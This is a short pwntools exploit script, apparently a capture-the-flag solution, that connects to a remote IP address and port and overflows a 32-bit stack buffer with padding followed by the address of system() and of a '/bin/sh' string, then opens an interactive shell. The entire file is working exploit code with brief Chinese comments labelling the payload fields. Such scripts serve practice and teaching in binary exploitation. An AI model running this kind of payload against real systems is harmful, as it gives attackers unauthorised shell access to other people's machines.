from pwn import *

context.log_level = 'DEBUG'

# p = process('../file/1ab77c073b4f4524b73e086d063f884e')
p = remote('61.147.171.105', '62254')

input('continue?')

system_addr = 0x08048320
binsh_addr = 0x0804a024

p.recvuntil(b':\n')
p.sendline(flat(
    b'a' * 0x88,
    b'a' * 4,
    p32(system_addr), #函数地址
    p32(0), #返回地址随意填
    p32(binsh_addr) #最后一个参数
))

p.interactive()